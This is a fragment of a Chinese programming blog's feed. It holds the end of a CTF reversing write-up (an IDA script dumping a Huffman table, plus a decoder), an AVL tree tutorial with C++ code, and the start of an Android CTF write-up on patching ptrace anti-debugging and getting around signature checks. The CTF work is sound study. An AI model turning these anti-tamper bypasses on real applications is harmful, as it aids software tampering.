src="/2021/05/28/Redhat-filestore/image-20210528023701996.png" class="" title="image-20210528023701996"><p>遍历函数到达叶子结点的时候，将 01 路径串与字符通过 stl map 建立关联。</p><p>输入文件 flag.txt.shuffled ，并在此处尝试 dump 关联的键值对即可获取 01串与真实数据之间的编码关系.</p><p>dump ida 脚本如下, 该脚本使用方法是在 <code>40171D call    find</code> 处设置条件断点为 bp_dumper() 即可.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> idaapi<br><span class="hljs-keyword">import</span> idc<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode_stl_str</span>(<span class="hljs-params">p</span>):</span><br>    size = idc.read_dbg_qword(p + <span class="hljs-number">0x8</span>)<br>    dataPtr = idc.read_dbg_qword(p)<br>    buf = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size):<br>        buf.append(idc.read_dbg_byte(dataPtr + i))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytearray</span>(buf)<br><br><span class="hljs-comment"># bp 40171D</span><br>reverseMap = &#123;&#125;<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bp_dumper</span>():</span><br>    <span class="hljs-keyword">global</span> reverseMap<br>    pNodeVal = idc.get_reg_value(<span class="hljs-string">&#x27;rsi&#x27;</span>)<br>    nodeVal = idc.read_dbg_byte(pNodeVal)<br>    rbp = idc.get_reg_value(<span class="hljs-string">&#x27;rbp&#x27;</span>)<br>    pStr = idc.read_dbg_qword(rbp - <span class="hljs-number">0x58</span>)<br>    huffmanCode = decode_stl_str(pStr).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    print(<span class="hljs-built_in">chr</span>(nodeVal), huffmanCode)<br>    reverseMap[huffmanCode] = <span class="hljs-built_in">chr</span>(nodeVal)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br></code></pre></td></tr></table></figure><p>当所有的键值队都记录之后，print(reverseMap) 就可以得到对应关系, 我得到的数据如下</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">huffman = &#123;&#x27;<span class="hljs-number">00000000</span>&#x27;: &#x27;T&#x27;, &#x27;<span class="hljs-number">00000001</span>&#x27;: &#x27;6&#x27;, &#x27;<span class="hljs-number">000000</span>1&#x27;: &#x27;1&#x27;, &#x27;<span class="hljs-number">0000010000</span>&#x27;: &#x27;L&#x27;, &#x27;<span class="hljs-number">0000010001</span>&#x27;: &#x27;R&#x27;, &#x27;<span class="hljs-number">0000010010</span>&#x27;: &#x27;&#125;&#x27;, &#x27;<span class="hljs-number">0000010011</span>&#x27;: &#x27;M&#x27;, &#x27;<span class="hljs-number">0000010100</span>&#x27;: &#x27;;&#x27;, &#x27;<span class="hljs-number">0000010101</span>&#x27;: &#x27;C&#x27;, &#x27;<span class="hljs-number">0000010110</span>&#x27;: &#x27;&#123;&#x27;, &#x27;<span class="hljs-number">0000010111</span>&#x27;: &#x27;x&#x27;, &#x27;<span class="hljs-number">0000011000</span>&#x27;: &#x27;F&#x27;, &#x27;<span class="hljs-number">0000011001</span>&#x27;: &#x27;J&#x27;, &#x27;<span class="hljs-number">0000011010</span>&#x27;: &#x27;q&#x27;, &#x27;<span class="hljs-number">0000011011</span>&#x27;: &#x27;9&#x27;, &#x27;<span class="hljs-number">00000111</span>0&#x27;: &#x27;G&#x27;, &#x27;<span class="hljs-number">00000111</span>1&#x27;: &#x27;4&#x27;, &#x27;<span class="hljs-number">00001000</span>0&#x27;: &#x27;2&#x27;, &#x27;<span class="hljs-number">00001000</span>1&#x27;: <span class="hljs-string">&quot;&#x27;&quot;</span>, &#x27;<span class="hljs-number">00001001</span>0&#x27;: &#x27;7&#x27;, &#x27;<span class="hljs-number">00001001</span>1&#x27;: &#x27;W&#x27;, &#x27;<span class="hljs-number">000010</span>1&#x27;: &#x27;-&#x27;, &#x27;<span class="hljs-number">00001100</span>&#x27;: &#x27;k&#x27;, &#x27;<span class="hljs-number">00001101</span>&#x27;: &#x27;3&#x27;, &#x27;<span class="hljs-number">000011</span>1&#x27;: &#x27;b&#x27;, &#x27;<span class="hljs-number">0001</span>&#x27;: &#x27;i&#x27;, &#x27;001&#x27;: &#x27;e&#x27;, &#x27;<span class="hljs-number">0100</span>&#x27;: &#x27;n&#x27;, &#x27;<span class="hljs-number">0101</span>0&#x27;: &#x27;f&#x27;, &#x27;<span class="hljs-number">010110</span>&#x27;: &#x27;y&#x27;, &#x27;<span class="hljs-number">010111</span>&#x27;: &#x27;u&#x27;, &#x27;<span class="hljs-number">0110</span>&#x27;: &#x27;o&#x27;, &#x27;<span class="hljs-number">0111</span>&#x27;: &#x27;r&#x27;, &#x27;<span class="hljs-number">1000</span>0&#x27;: &#x27;l&#x27;, &#x27;<span class="hljs-number">100010</span>0&#x27;: &#x27;S&#x27;, &#x27;<span class="hljs-number">100010</span>1&#x27;: &#x27;v&#x27;, &#x27;<span class="hljs-number">100011</span>&#x27;: &#x27;g&#x27;, &#x27;<span class="hljs-number">1001</span>0&#x27;: &#x27;d&#x27;, &#x27;<span class="hljs-number">100110</span>0&#x27;: &#x27;H&#x27;, &#x27;<span class="hljs-number">100110</span>1&#x27;: &#x27;p&#x27;, &#x27;<span class="hljs-number">10011100</span>&#x27;: &#x27;A&#x27;, &#x27;<span class="hljs-number">10011101</span>0&#x27;: &#x27;8&#x27;, &#x27;<span class="hljs-number">10011101</span>1&#x27;: &#x27;\r&#x27;, &#x27;<span class="hljs-number">10011110</span>0&#x27;: &#x27;5&#x27;, &#x27;<span class="hljs-number">1001111010</span>&#x27;: &#x27;:&#x27;, &#x27;<span class="hljs-number">1001111011</span>0&#x27;: &#x27;(&#x27;, &#x27;<span class="hljs-number">1001111011</span>1&#x27;: &#x27;)&#x27;, &#x27;<span class="hljs-number">10011111</span>0&#x27;: &#x27;\n&#x27;, &#x27;<span class="hljs-number">10011111</span>1&#x27;: &#x27;B&#x27;, &#x27;<span class="hljs-number">1010</span>&#x27;: &#x27;t&#x27;, &#x27;<span class="hljs-number">101100</span>&#x27;: &#x27;w&#x27;, &#x27;<span class="hljs-number">101101</span>&#x27;: &#x27;m&#x27;, &#x27;<span class="hljs-number">101110</span>0&#x27;: &#x27;,&#x27;, &#x27;<span class="hljs-number">101110</span>1&#x27;: &#x27;.&#x27;, &#x27;<span class="hljs-number">101111</span>&#x27;: &#x27;c&#x27;, &#x27;<span class="hljs-number">1100</span>&#x27;: &#x27;a&#x27;, &#x27;<span class="hljs-number">1101</span>0&#x27;: &#x27;h&#x27;, &#x27;<span class="hljs-number">1101</span>1&#x27;: &#x27;s&#x27;, &#x27;111&#x27;: &#x27; &#x27;&#125;<br></code></pre></td></tr></table></figure><h2 id="二叉树数据结构"><a href="#二叉树数据结构" class="headerlink" title="二叉树数据结构"></a>二叉树数据结构</h2><ol><li>叶结点</li></ol><p>叶结点才是带数据的结点</p><img src="/2021/05/28/Redhat-filestore/image-20210528024828578.png" class="" title="image-20210528024828578"><ol start="2"><li>非叶子节点</li></ol><img src="/2021/05/28/Redhat-filestore/image-20210528025054776.png" class="" title="image-20210528025054776"><p>这两种结构的第二个 dd 的数据可以用来区分叶节点或者非叶子节点，区分值 0FFFFFFFF</p><p>叶子节点和非叶子节点的数据类型结构不一样，但是却通过非叶子节点中同一个指针字段指向，很少见。</p><h2 id="后续小细节"><a href="#后续小细节" class="headerlink" title="后续小细节"></a>后续小细节</h2><ol><li>01 字符串转字节流  40878C</li></ol><img src="/2021/05/28/Redhat-filestore/image-20210528025352961.png" class="" title="image-20210528025352961"><p>下断点观察数据即可</p><ol start="2"><li>最后一步输出还有一个加密算法</li></ol><img src="/2021/05/28/Redhat-filestore/image-20210528025426509.png" class="" title="image-20210528025426509"><p>这是一种类似rc4 带入密文即可得到明文的加密算法, 动态调试修改数据即可解密。</p><ol start="3"><li>解压过程</li></ol><p>我直接暴力匹配 01串前缀，匹配成功的则删除待解压数据的前缀，最终删除所有待解压数据，得到已经解压的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">data = <span class="hljs-built_in">bytearray</span>(data)<br>s = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>    s += <span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfille(<span class="hljs-number">8</span>)<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">while</span> s != <span class="hljs-string">&#x27;&#x27;</span>:<br>    <span class="hljs-keyword">for</span> prefix <span class="hljs-keyword">in</span> huffman:<br>        <span class="hljs-keyword">if</span> s.startswith(prefix):<br>            flag += huffman[prefix]<br>            s = s[<span class="hljs-built_in">len</span>(prefix): ]<br></code></pre></td></tr></table></figure><p>最后得到 flag</p><img src="/2021/05/28/Redhat-filestore/image-20210528025802761.png" class="" title="image-20210528025802761">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;红帽杯2021-file-store&quot;&gt;&lt;a href=&quot;#红帽杯2021-file-store&quot; class=&quot;headerlink&quot; title=&quot;红帽杯2021 file_store&quot;&gt;&lt;/a&gt;红帽杯2021 file_store&lt;/h1&gt;&lt;p&gt;题目下载: </summary>
      
    
    
    
    <category term="CTF" scheme="https://panda0s.top/categories/CTF/"/>
    
    
    <category term="Reverse" scheme="https://panda0s.top/tags/Reverse/"/>
    
    <category term="Huffman" scheme="https://panda0s.top/tags/Huffman/"/>
    
    <category term="STL" scheme="https://panda0s.top/tags/STL/"/>
    
  </entry>
  
  <entry>
    <title>AVL Tree</title>
    <link href="https://panda0s.top/2021/05/26/AVL-Tree/"/>
    <id>https://panda0s.top/2021/05/26/AVL-Tree/</id>
    <published>2021-05-26T07:08:47.000Z</published>
    <updated>2021-05-26T08:02:46.592Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AVL-平衡二叉树"><a href="#AVL-平衡二叉树" class="headerlink" title="AVL 平衡二叉树"></a>AVL 平衡二叉树</h1><p>AVL 平衡二叉树在 BST 的基础上要求左右两子树的高度差不超过 1</p><p>插入新的元素可能影响树的平衡性，为了使插入元素后的树继续满足 AVL 性质，要对树进行一些调整。</p><p>插入新的元素后，有四种情况，分别为 <code>LL</code>, <code>LR</code>,<code>RR</code>,<code>RL</code></p><p>调整的方法是对最小不满足AVL性质的子树进行旋转操作。</p><p>左旋和右旋</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">T1, T2 <span class="hljs-keyword">and</span> T3 are subtrees <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> tree <br>rooted <span class="hljs-keyword">with</span> y (<span class="hljs-keyword">on</span> <span class="hljs-title">the</span> <span class="hljs-title">left</span> <span class="hljs-title">side</span>) <span class="hljs-title">or</span> <span class="hljs-title">x</span> (<span class="hljs-title">on</span> <br><span class="hljs-keyword">the</span> <span class="hljs-literal">right</span> side)           <br>     y                               x<br>    / \     Right Rotation          /  \<br>   x   T3   - - - - - - - &gt;        T1   y <br>  / \       &lt; - - - - - - -            / \<br> T1  T2     Left Rotation            T2  T3<br>Keys <span class="hljs-keyword">in</span> both <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> above trees follow <span class="hljs-keyword">the</span> <br>following order <br> <span class="hljs-built_in">keys</span>(T1) &lt; key(x) &lt; <span class="hljs-built_in">keys</span>(T2) &lt; key(y) &lt; <span class="hljs-built_in">keys</span>(T3)<br>So BST property is <span class="hljs-keyword">not</span> violated anywhere.<br></code></pre></td></tr></table></figure><p>左旋和右旋操作后，子树仍然满足 BST 的性质，但是某些情况下可以降低子树的高度。</p><p>插入新的元素后，找到最小不满足 AVL 性质的子树，有以下四种情况（左侧） </p><p>主要关注 Z, Y, X</p><ol><li><strong>Left Left Case</strong>  (LL)</li></ol><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript">T1, T2, T3 <span class="hljs-keyword">and</span> T4 are subtrees.<br>         z                                      y <br>        / <span class="hljs-string">\</span>                                   /   <span class="hljs-string">\</span><br>       y   T4      Right Rotate (z)          x      z<br>      / <span class="hljs-string">\</span>          - - - - - - - - -&gt;      /  <span class="hljs-string">\</span>    /  <span class="hljs-string">\</span> <br>     x   T3                               T1  T2  T3  T4<br>    / <span class="hljs-string">\</span><br>  T1   T2<br></code></pre></td></tr></table></figure><p>具体例子</p><table><thead><tr><th><img src="/2021/05/26/AVL-Tree/image-20210526153058326.png" class="" title="image-20210526153058326"></th><th><img src="/2021/05/26/AVL-Tree/image-20210526152831752.png" class="" title="image-20210526152831752"></th></tr></thead></table><ol start="2"><li><strong>Left Right Case</strong> (LR)</li></ol><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">     z                               z                           x<br>    / <span class="hljs-string">\</span>                            /   <span class="hljs-string">\</span>                        /  <span class="hljs-string">\</span> <br>   y   T4  Left Rotate (y)        x    T4  Right Rotate(z)    y      z<br>  / <span class="hljs-string">\</span>      - - - - - - - - -&gt;    /  <span class="hljs-string">\</span>      - - - - - - - -&gt;  / <span class="hljs-string">\</span>    / <span class="hljs-string">\</span><br>T1   x                          y    T3                    T1  T2 T3  T4<br>    / <span class="hljs-string">\</span>                        / <span class="hljs-string">\</span><br>  T2   T3                    T1   T2<br></code></pre></td></tr></table></figure><p>具体例子</p><table><thead><tr><th><img src="/2021/05/26/AVL-Tree/image-20210526153159164.png" class="" title="image-20210526153159164"></th><th><img src="/2021/05/26/AVL-Tree/image-20210526153213414.png" class="" title="image-20210526153213414"></th></tr></thead></table><ol start="3"><li><strong>Right Right Case</strong> (RR)</li></ol><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">  z                                y<br> /  <span class="hljs-string">\</span>                            /   <span class="hljs-string">\</span> <br>T1   y     Left Rotate(z)       z      x<br>    /  <span class="hljs-string">\</span>   - - - - - - - -&gt;    / <span class="hljs-string">\</span>    / <span class="hljs-string">\</span><br>   T2   x                     T1  T2 T3  T4<br>       / <span class="hljs-string">\</span><br>     T3  T4<br></code></pre></td></tr></table></figure><table><thead><tr><th><img src="/2021/05/26/AVL-Tree/image-20210526153446889.png" class="" title="image-20210526153446889"></th><th><img src="/2021/05/26/AVL-Tree/image-20210526153454332.png" class="" title="image-20210526153454332"></th></tr></thead></table><ol start="4"><li><strong>Right Left Case</strong></li></ol><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">   z                            z                            x<br>  / <span class="hljs-string">\</span>                          / <span class="hljs-string">\</span>                          /  <span class="hljs-string">\</span> <br>T1   y   Right Rotate (y)    T1   x      Left Rotate(z)   z      y<br>    / <span class="hljs-string">\</span>  - - - - - - - - -&gt;     /  <span class="hljs-string">\</span>   - - - - - - - -&gt;  / <span class="hljs-string">\</span>    / <span class="hljs-string">\</span><br>   x   T4                      T2   y                  T1  T2  T3  T4<br>  / <span class="hljs-string">\</span>                              /  <span class="hljs-string">\</span><br>T2   T3                           T3   T4<br></code></pre></td></tr></table></figure><table><thead><tr><th><img src="/2021/05/26/AVL-Tree/image-20210526153542945.png" class="" title="image-20210526153542945"></th><th><img src="/2021/05/26/AVL-Tree/image-20210526153550750.png" class="" title="image-20210526153550750"></th></tr></thead></table><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>leetcode 题</p><p><a href="https://leetcode-cn.com/problems/balance-a-binary-search-tree/">https://leetcode-cn.com/problems/balance-a-binary-search-tree/</a></p><p>非递归版本….xjb 手写能过 leetcode</p><p>插入过程:</p><p>遍历找插入位置 -&gt; 插入 -&gt; 更新高度 -&gt; 发现左右子树高度差大于 2 -&gt; 判断旋转类型 -&gt; 旋转</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key)</span> </span>&#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>, key);<br>      AVLTreeNode * new_node = _alloca_node();<br>      new_node-&gt;key = key;<br>      new_node-&gt;height = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">if</span> ( root == <span class="hljs-literal">nullptr</span>) &#123;<br>          root = new_node;<br>          <span class="hljs-keyword">return</span>;<br>      &#125;<br><br>      <span class="hljs-comment">// 找到一个合适的插入位置</span><br>      AVLTreeNode * insert_node = root;<br>      <span class="hljs-keyword">while</span> ( (key &lt;= insert_node-&gt;key &amp;&amp; insert_node-&gt;left) || (key &gt; insert_node-&gt;key &amp;&amp; insert_node-&gt;right) ) &#123;<br>          insert_node = key&lt;=insert_node-&gt;key?insert_node-&gt;left:insert_node-&gt;right;<br>      &#125;<br><br>      <span class="hljs-comment">// 插入到找到的位置.</span><br>      new_node-&gt;parent = insert_node;<br>      <span class="hljs-keyword">if</span> ( key &lt;= insert_node-&gt;key )<br>          insert_node-&gt;left = new_node;<br>      <span class="hljs-keyword">else</span><br>          insert_node-&gt;right = new_node;<br><br>      <span class="hljs-comment">// 更新高度</span><br>      AVLTreeNode * travel = new_node-&gt;parent;<br>      AVLTreeNode * lastBugTree = <span class="hljs-literal">nullptr</span>;<br>      <span class="hljs-keyword">int</span> balance;<br>      <span class="hljs-keyword">while</span> (travel) &#123;<br>          <span class="hljs-keyword">int</span> height_r, height_l;<br>          height_l = travel-&gt;left ? travel-&gt;left-&gt;height : <span class="hljs-number">0</span>;<br>          height_r = travel-&gt;right ? travel-&gt;right-&gt;height : <span class="hljs-number">0</span>;<br>          travel-&gt;height = max(height_l, height_r) + <span class="hljs-number">1</span>;<br>          balance = height_l - height_r;<br>          <span class="hljs-keyword">if</span>(<span class="hljs-built_in">abs</span>(balance) &gt; <span class="hljs-number">1</span>) &#123;<br>              lastBugTree = travel;<br>              <span class="hljs-keyword">break</span>;<br>          &#125;<br>          travel = travel-&gt;parent;<br>      &#125;<br><br>      <span class="hljs-comment">// 旋转</span><br>      AVLTreeNode * new_root;<br>      <span class="hljs-keyword">if</span> (lastBugTree) &#123;<br>          AVLTreeNode * lastBugParent;<br>          lastBugParent = lastBugTree-&gt;parent;<br>          <span class="hljs-keyword">if</span>(balance &gt; <span class="hljs-number">1</span> &amp;&amp; new_node-&gt;key &lt; lastBugTree-&gt;left-&gt;key) &#123;<br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Type1\n&quot;</span>);<br>              new_root = right_rotate(lastBugTree);<br>          &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(balance &gt; <span class="hljs-number">1</span> &amp;&amp; new_node-&gt;key &gt; lastBugTree-&gt;left-&gt;key)&#123;<br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Type2\n&quot;</span>);<br>              new_root = left_right_rotate(lastBugTree);<br>          &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(balance &lt; <span class="hljs-number">0</span> &amp;&amp; new_node-&gt;key &gt; lastBugTree-&gt;right-&gt;key) &#123;<br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;type3\n&quot;</span>);<br>              new_root = left_rotate(lastBugTree);<br>          &#125; <span class="hljs-keyword">else</span>  <span class="hljs-keyword">if</span>(balance &lt; <span class="hljs-number">0</span> &amp;&amp; new_node-&gt;key &lt; lastBugTree-&gt;right-&gt;key) &#123;<br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Type4\n&quot;</span>);<br>              new_root = right_left_rotate(lastBugTree);<br>          &#125;<br><br>          <span class="hljs-keyword">if</span> (!lastBugParent) &#123;<br>              root = new_root;<br>          &#125;<span class="hljs-keyword">else</span> &#123;<br>              <span class="hljs-keyword">if</span> (lastBugParent-&gt;key &gt; lastBugTree-&gt;key)<br>                  lastBugParent-&gt;left = new_root;<br>              <span class="hljs-keyword">else</span><br>                  lastBugParent-&gt;right = new_root;<br>          &#125;;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>旋转相关的代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">AVLTreeNode * <span class="hljs-title">right_rotate</span><span class="hljs-params">(AVLTreeNode * z)</span> </span>&#123;<br>    AVLTreeNode * y = z-&gt;left;<br>    AVLTreeNode * x = y-&gt;left;<br><br>    y-&gt;parent  = z-&gt;parent;<br>    z-&gt;left = y-&gt;right;<br>    <span class="hljs-keyword">if</span> (z-&gt;left) z-&gt;left-&gt;parent = z;<br>    y-&gt;right = z;<br>    z-&gt;parent = y;<br>    <span class="hljs-comment">// 更新高度</span><br>    z-&gt;height = get_height(z) + <span class="hljs-number">1</span>;<br>    y-&gt;height = get_height(y) + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> y;<br>&#125;<br><br><span class="hljs-function">AVLTreeNode * <span class="hljs-title">left_rotate</span><span class="hljs-params">(AVLTreeNode * z)</span> </span>&#123;<br>    AVLTreeNode * y = z-&gt;right;<br>    AVLTreeNode * x = y-&gt;right;<br><br>    z-&gt;right = y-&gt;left;<br><br>    <span class="hljs-keyword">if</span> (z-&gt;right)<br>        z-&gt;right-&gt;parent = z;<br>    y-&gt;parent = z-&gt;parent;<br>    z-&gt;parent = y;<br>    y-&gt;left = z;<br>    <span class="hljs-comment">// 更新高度</span><br>    z-&gt;height = get_height(z) + <span class="hljs-number">1</span>;<br>    y-&gt;height = get_height(y) + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> y;<br>&#125;<br><br><span class="hljs-function">AVLTreeNode * <span class="hljs-title">left_right_rotate</span><span class="hljs-params">(AVLTreeNode * z)</span> </span>&#123;<br>    AVLTreeNode * y = z-&gt;left;<br>    AVLTreeNode * x = y-&gt;right;<br>    z-&gt;left = left_rotate(y);<br>    <span class="hljs-keyword">return</span> right_rotate(z);<br>&#125;<br><br><br><span class="hljs-function">AVLTreeNode * <span class="hljs-title">right_left_rotate</span><span class="hljs-params">(AVLTreeNode * z)</span> </span>&#123;<br>    AVLTreeNode * y = z-&gt;right;<br>    AVLTreeNode * x = y-&gt;left;<br>    z-&gt;right = right_rotate(y);<br>    <span class="hljs-keyword">return</span> left_rotate(z);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>[1] AVL 数据可视化 <a href="https://www.cs.usfca.edu/~galles/visualization/AVLtree.html">https://www.cs.usfca.edu/~galles/visualization/AVLtree.html</a><br>[2] AVL Tree | Set 1 (Insertion) <a href="https://www.geeksforgeeks.org/avl-tree-set-1-insertion/">https://www.geeksforgeeks.org/avl-tree-set-1-insertion/</a><br>[3] Data Structure and Algorithms - AVL Trees <a href="https://www.tutorialspoint.com/data_structures_algorithms/avl_tree_algorithm.htm">https://www.tutorialspoint.com/data_structures_algorithms/avl_tree_algorithm.htm</a></p><p>[4] leetcode 1382. 将二叉搜索树变平衡 <a href="https://leetcode-cn.com/problems/balance-a-binary-search-tree/">https://leetcode-cn.com/problems/balance-a-binary-search-tree/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;AVL-平衡二叉树&quot;&gt;&lt;a href=&quot;#AVL-平衡二叉树&quot; class=&quot;headerlink&quot; title=&quot;AVL 平衡二叉树&quot;&gt;&lt;/a&gt;AVL 平衡二叉树&lt;/h1&gt;&lt;p&gt;AVL 平衡二叉树在 BST 的基础上要求左右两子树的高度差不超过 1&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="DataStruct" scheme="https://panda0s.top/categories/DataStruct/"/>
    
    
    <category term="AVL" scheme="https://panda0s.top/tags/AVL/"/>
    
  </entry>
  
  <entry>
    <title>ISCC-mobile AES</title>
    <link href="https://panda0s.top/2021/05/25/ISCC-mobile-AES/"/>
    <id>https://panda0s.top/2021/05/25/ISCC-mobile-AES/</id>
    <published>2021-05-24T16:31:48.000Z</published>
    <updated>2021-05-24T16:49:31.239Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ISCC2021-mobile"><a href="#ISCC2021-mobile" class="headerlink" title="ISCC2021 mobile"></a>ISCC2021 mobile</h1><p>题目下载:  <a href="/2021/05/25/ISCC-mobile-AES/iscc-aes.apk" title="iscc-aes.apk">iscc-aes.apk</a></p><p>这是一道 apk 逆向，核心函数位于 SO 库中并且在 JNI_OnLoad 中动态绑定函数。</p><ol><li><p>反调试</p><p> JNI_OnLoad 中有 ptrace 反调试，patch 掉即可</p></li><li><p>签名验证</p><p> 这道题的密钥由 apk 签名数据决定，因此要获取原始密钥，必须保证 apk 没有更改。但是为了反反调试，必须 patch so 文件。</p><p> 这里可以采取直接将修改的 so 文件 push 到 apk 安装后的目录中，这样并不会改变 apk 本身的签名。</p></li><li><p>核心算法是 AES 变种 + CBC 模式</p></li></ol><p>要解密如下字符串</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">j9lXGz</span>/eWs<span class="hljs-number">4</span>iODrHgTbQZdtXl<span class="hljs-number">1</span>RjO<span class="hljs-number">82</span>FQhSADajx<span class="hljs-number">1</span>vRNnw<span class="hljs-number">2</span>NIASP/<span 